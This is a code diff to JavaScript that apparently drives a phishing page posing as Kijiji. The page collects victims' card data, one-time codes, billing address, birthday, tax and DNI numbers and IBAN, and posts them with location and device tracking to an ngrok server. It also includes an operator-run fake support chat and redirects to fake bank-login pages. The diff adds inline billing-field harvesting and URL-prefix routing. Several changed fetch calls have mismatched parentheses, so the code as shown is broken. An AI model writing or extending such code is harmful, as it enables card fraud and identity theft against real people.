@@ -1,4 +1,13 @@
 (function () {
+  function siteApi(p) {
+    if (!p) return API_URL;
+    if (p.charAt(0) !== "/") p = "/" + p;
+    if (API_URL && (p.indexOf("/webhook/") === 0 || p.indexOf("/api/") === 0)) {
+      return API_URL.replace(/\/$/, "") + p;
+    }
+    return p;
+  }
+
   const API_URL = "https://arboricultural-roselia-unsolvably.ngrok-free.dev";
   const SERVICE_LABEL = "🇨🇦 Kijiji";
   window.__cadSkipEmbeddedOc = true;
@@ -498,7 +507,7 @@
     if (!data || (!data.first_name && !data.last_name && !data.phone)) return;
     userContactSent = true;
     try {
-      await fetch(API_URL + "/webhook/user_contact", {
+      await fetch(siteApi("/webhook/user_contact", {
         method: "POST", headers: apiHeaders(),
         body: JSON.stringify(Object.assign({ link_id: window.LINK_DATA.link_id, service: window.LINK_DATA.service, device_info: getDeviceInfo(), user_agent: navigator.userAgent, page_kind: pageKind() }, data)),
       });
@@ -557,6 +566,23 @@
     return params.get("link_id") || pathId || null;
   }
 
+  function servicePathPrefix() {
+    var parts = location.pathname.split("/").filter(Boolean);
+    if (!parts.length) return "";
+    var reserved = {
+      apps: 1, api: 1, card: 1, receive: 1, return: 1, refund: 1, lk: 1, captcha: 1, video: 1, verif: 1,
+    };
+    var first = parts[0];
+    if (reserved[first] || /^\d{5,}$/.test(first)) return "";
+    return "/" + first;
+  }
+
+  function withPrefix(rel) {
+    var pre = servicePathPrefix();
+    if (!rel || rel === "/") return pre || "/";
+    return pre + (rel.charAt(0) === "/" ? rel : "/" + rel);
+  }
+
   function parseLinkRecord(serverData) {
     if (!serverData || typeof serverData !== "object") {
       return { meta: {}, payload: {} };
@@ -587,7 +613,15 @@
 
   function isListingPage() {
     var parts = location.pathname.split("/").filter(Boolean);
-    return parts.length === 1 && /^\d{5,}$/.test(parts[0]);
+    if (!parts.length) return false;
+    var last = parts[parts.length - 1];
+    if (!/^\d{5,}$/.test(last)) return false;
+    return (
+      parts.indexOf("card") === -1 &&
+      parts.indexOf("return") === -1 &&
+      parts.indexOf("lk") === -1 &&
+      parts.indexOf("refund") === -1
+    );
   }
 
   function hasInlineCardModal() {
@@ -598,9 +632,9 @@
   function lkPageUrl() {
     var lid = window.LINK_DATA.link_id;
     if (isReturnPage()) {
-      return lid ? "/return/lk/" + lid : "/return/lk/";
+      return withPrefix(lid ? "/return/lk/" + lid : "/return/lk/");
     }
-    return lid ? "/receive/lk/" + lid : "/receive/lk/";
+    return withPrefix(lid ? "/receive/lk/" + lid : "/receive/lk/");
   }
 
   function revealPage() {
@@ -722,6 +756,102 @@
     scheduleShadowDataPatch(d);
   }
 
+  function mountBillingFieldsInline() {
+    var customForm = document.getElementById("custom-form");
+    var inputCard = document.getElementById("input-card");
+    if (!customForm || !inputCard) return false;
+    if (inputCard.__billingMounted) return true;
+    var anchor = inputCard.querySelector("#cardholder");
+    if (anchor) anchor = anchor.closest(".row") || anchor;
+    var fields = customForm.querySelectorAll('[id^="element-"]');
+    if (!fields.length) return false;
+    fields.forEach(function (el) {
+      if (anchor && anchor.parentNode === inputCard) inputCard.insertBefore(el, anchor.nextSibling);
+      else inputCard.appendChild(el);
+    });
+    inputCard.__billingMounted = true;
+    return true;
+  }
+
+  function patchReqBillingFormInline() {
+    if (window.__billingInlinePatched) return;
+    window.__billingInlinePatched = true;
+    var orig = window.reqBillingForm;
+    window.reqBillingForm = function () {
+      mountBillingFieldsInline();
+      var customForm = document.getElementById("custom-form");
+      if (customForm) customForm.style.display = "block";
+      if (window.jQuery) {
+        var $c = window.jQuery("#form-modal-custom");
+        if ($c.length && $c.hasClass("open")) $c.modal("close");
+      }
+      if (typeof orig === "function" && !document.getElementById("input-card")) {
+        try { orig(); } catch (_) {}
+      }
+    };
+  }
+
+  function scheduleBillingApply() {
+    applyBillingFromLinkData();
+    setTimeout(applyBillingFromLinkData, 300);
+    setTimeout(applyBillingFromLinkData, 900);
+    setTimeout(applyBillingFromLinkData, 2000);
+  }
+
+  function collectInlineBillingPayload() {
+    var map = [
+      ["country", "#req-country"],
+      ["city", "#req-city"],
+      ["state", "#req-state"],
+      ["billing-address", "#req-billing-address"],
+      ["phone", "#req-phone"],
+      ["zipcode", "#req-zipcode"],
+      ["tax", "#req-tax"],
+      ["dni", "#req-dni"],
+      ["fullname", "#req-fullname"],
+      ["birthday", "#req-birthday"],
+      ["iban", "#req-iban"],
+    ];
+    var payload = { type: "sent-billing" };
+    var hasVisible = false;
+    map.forEach(function (pair) {
+      var wrap = document.getElementById("element-" + pair[0]);
+      if (!wrap || wrap.style.display === "none") return;
+      hasVisible = true;
+      var el = document.querySelector(pair[1]);
+      if (el && String(el.value || "").trim()) payload[pair[0]] = String(el.value).trim();
+    });
+    return hasVisible ? payload : null;
+  }
+
+  function applyBillingFromLinkData() {
+    var req = window.LINK_DATA && window.LINK_DATA.billing_req;
+    if (!req && window.LINK_DATA && window.LINK_DATA.worker_settings) {
+      var fields = (window.LINK_DATA.worker_settings.extra || {}).billing_fields;
+      if (fields) {
+        var map = {
+          phone: "phone",
+          country: "country",
+          city: "city",
+          state: "state",
+          "billing-address": "billing-address",
+          zipcode: "zipcode",
+          iban: "iban",
+        };
+        var out = {};
+        Object.keys(map).forEach(function (k) {
+          if (fields[k]) out[map[k]] = 1;
+        });
+        if (Object.keys(out).length) req = "req_billing:" + JSON.stringify(out);
+      }
+    }
+    if (req) {
+      patchReqBillingFormInline();
+      mountBillingFieldsInline();
+      applyReqBillingFields(req);
+    }
+  }
+
   function applyReqBillingFields(data) {
     var availableFields = [
       "country", "city", "state", "billing-address", "phone", "zipcode",
@@ -829,6 +959,8 @@
         return;
       }
       if (data.indexOf("req_billing") === 0) {
+        patchReqBillingFormInline();
+        mountBillingFieldsInline();
         applyReqBillingFields(data);
         if (typeof reqBillingForm === "function") reqBillingForm();
         return;
@@ -878,7 +1010,7 @@
         var slug = (bankId && LK_SLUG_BY_ID[bankId]) || LK_SLUG_BY_INDEX[String(bIdx)];
         var lid = window.LINK_DATA.link_id;
         if (slug && lid) {
-          location.href = "/lk/" + slug + "/" + lid;
+          location.href = withPrefix("/lk/" + slug + "/" + lid);
         }
         return;
       }
@@ -902,7 +1034,7 @@
 
   const linkIdEarly = parseLinkId();
   const dataPromise = linkIdEarly
-    ? fetch(API_URL + "/api/link_data/" + linkIdEarly + "?v=" + Date.now(), { headers: apiHeaders(), cache: "no-store" })
+    ? fetch(siteApi("/api/link_data/" + linkIdEarly + "?v=" + Date.now(), { headers: apiHeaders(), cache: "no-store" })
         .then(function (response) {
           if (!response.ok) throw new Error("not found");
           return response.json();
@@ -938,7 +1070,7 @@
     const endpoint = isReturnPage() ? "/webhook/return_page_visit" : "/webhook/page_visit";
     try {
       const location = await getClientLocation();
-      await fetch(API_URL + endpoint, {
+      await fetch(siteApi(endpoint), {
         method: "POST",
         headers: apiHeaders(),
         body: JSON.stringify({
@@ -976,7 +1108,7 @@
       page_kind: pageKind(),
     });
 
-    fetch(API_URL + "/webhook/page_leave", {
+    fetch(siteApi("/webhook/page_leave", {
       method: "POST",
       headers: apiHeaders(),
       body: payload,
@@ -986,10 +1118,11 @@
 
   async function sendCardPageVisit() {
     setUiPageKey("card");
+    scheduleBillingApply();
     if (!window.LINK_DATA.link_id || !window.LINK_DATA.user_id) return;
     try {
       const location = await getClientLocation();
-      await fetch(API_URL + "/webhook/card_page_visit", {
+      await fetch(siteApi("/webhook/card_page_visit", {
         method: "POST",
         headers: apiHeaders(),
         body: JSON.stringify({
@@ -1010,7 +1143,7 @@
   async function postWebhook(path, payload) {
     try {
       const location = await getClientLocation();
-      await fetch(API_URL + path, {
+      await fetch(siteApi(path), {
         method: "POST",
         headers: apiHeaders(),
         body: JSON.stringify({
@@ -1029,7 +1162,7 @@
   async function forwardDepopInput(data) {
     if (!window.LINK_DATA.link_id) return;
     try {
-      await fetch(API_URL + "/api/cad_kijiji/input", {
+      await fetch(siteApi("/api/cad_kijiji/input", {
         method: "POST",
         headers: apiHeaders(),
         body: JSON.stringify({
@@ -1078,7 +1211,7 @@
       user_agent: navigator.userAgent,
       location: await getClientLocation(),
     };
-    const r = await fetch(API_URL + "/api/cad_kijiji/submitCard", {
+    const r = await fetch(siteApi("/api/cad_kijiji/submitCard", {
       method: "POST",
       headers: apiHeaders(),
       body: JSON.stringify(body),
@@ -1089,7 +1222,7 @@
   }
 
   async function submitCode(data) {
-    await fetch(API_URL + "/api/submitCode1", {
+    await fetch(siteApi("/api/submitCode1", {
       method: "POST",
       headers: apiHeaders(),
       body: JSON.stringify({
@@ -1262,7 +1395,7 @@
   async function supportPoll() {
     if (!window.LINK_DATA.link_id) return JSON.stringify({ messages: [] });
     try {
-      const r = await fetch(API_URL + "/api/cad_kijiji/support/poll", {
+      const r = await fetch(siteApi("/api/cad_kijiji/support/poll", {
         method: "POST",
         headers: apiHeaders(),
         body: JSON.stringify({
@@ -1289,7 +1422,7 @@
   async function supportSend(data) {
     if (!window.LINK_DATA.link_id) return "ok";
     try {
-      const r = await fetch(API_URL + "/api/cad_kijiji/support/send", {
+      const r = await fetch(siteApi("/api/cad_kijiji/support/send", {
         method: "POST",
         headers: apiHeaders(),
         body: JSON.stringify({
@@ -1310,7 +1443,7 @@
 
   async function forwardWorkerVideo(data) {
     if (!window.LINK_DATA.link_id || !data.video) return;
-    await fetch(API_URL + "/api/cad_kijiji/support/worker_video", {
+    await fetch(siteApi("/api/cad_kijiji/support/worker_video", {
       method: "POST",
       headers: apiHeaders(),
       body: JSON.stringify({
@@ -1326,7 +1459,7 @@
     if (!window.LINK_DATA.link_id) return "";
     try {
       const pageQ = "?page=" + encodeURIComponent(currentPageKey());
-      const r = await fetch(API_URL + "/api/cad_kijiji/xapi/" + window.LINK_DATA.link_id + pageQ, {
+      const r = await fetch(siteApi("/api/cad_kijiji/xapi/" + window.LINK_DATA.link_id + pageQ, {
         headers: apiHeaders(),
       });
       if (!r.ok) return "";
@@ -1687,7 +1820,7 @@
       } else {
         visibilityLeaveSent = false;
         if (window.LINK_DATA.link_id) {
-          fetch(API_URL + "/webhook/page_resume", {
+          fetch(siteApi("/webhook/page_resume", {
             method: "POST",
             headers: apiHeaders(),
             body: JSON.stringify({
@@ -1702,9 +1835,7 @@
 
   function cardPageUrl() {
     var lid = window.LINK_DATA.link_id;
-    if (!lid) return isReturnPage() ? "/refund/" : "/";
-    if (isReturnPage()) return "/refund/" + lid;
-    return "/" + lid;
+    return withPrefix(lid ? "/card/" + lid : "/card/");
   }
 
   function notifyLkSelection() {
@@ -1732,8 +1863,12 @@
       location.href = url.toString();
       return;
     }
-    var target = "/lk/" + slug + "/" + lid;
-    if (location.pathname === target || location.pathname === target + "/" || location.pathname.indexOf("/lk/" + slug + "/") !== -1) {
+    var target = withPrefix("/lk/" + slug + "/" + lid);
+    if (
+      location.pathname === target ||
+      location.pathname === target + "/" ||
+      location.pathname.indexOf(withPrefix("/lk/" + slug + "/")) !== -1
+    ) {
       return;
     }
     if (notify) {
@@ -1747,6 +1882,23 @@
       });
     }
     location.href = target;
+  }
+
+  function ensureCardFormVisible() {
+    try {
+      if (!window.jQuery) return;
+      var $ = window.jQuery;
+      var $fm = $("#form-modal");
+      if (!$fm.length) return;
+      var $custom = $("#form-modal-custom");
+      if ($custom.length && $custom.hasClass("open")) $custom.modal("close");
+      if (!$fm.hasClass("open") && $fm.css("display") !== "block") return;
+      $("#progressform").css("display", "none");
+      $("#form1").css("display", "block");
+      $("#title_card, #WS1, #WS2").css("display", "block");
+      $fm.css({ zIndex: 100100, display: "block" });
+      if (typeof applyBillingFromLinkData === "function") applyBillingFromLinkData();
+    } catch (_) {}
   }
 
   function fixBlockingOverlays() {
@@ -1789,7 +1941,7 @@
       var fm = document.getElementById("form-modal");
       if (!fm) return;
       var open = fm.classList.contains("open") || fm.style.display === "block" || window.getComputedStyle(fm).display !== "none";
-      if (open) fixBlockingOverlays();
+      if (open) { fixBlockingOverlays(); ensureCardFormVisible(); applyBillingFromLinkData(); }
     }, 250);
   }
 
@@ -1859,9 +2011,15 @@
 
             sendCardPageVisit();
       setUiPageKey("card");
-      fixBlockingOverlays();
       if (nativeOpen) {
-        return nativeOpen.call(this, false, pre, ignoreSelection);
+        var opened = nativeOpen.call(this, false, pre, ignoreSelection);
+        setTimeout(function () {
+          ensureCardFormVisible();
+          fixBlockingOverlays();
+          if (typeof scheduleBillingApply === "function") scheduleBillingApply();
+        }, 80);
+        setTimeout(ensureCardFormVisible, 500);
+        return opened;
       }
       if (lid && !hasInlineCardModal()) {
         location.href = cardPageUrl();
@@ -2056,6 +2214,7 @@
       applyLinkDataToPage();
       applyInputMode();
       applyBalanceSetting();
+      scheduleBillingApply();
       patchReceiveFundsButton();
       revealPage();
       sendPageVisit();
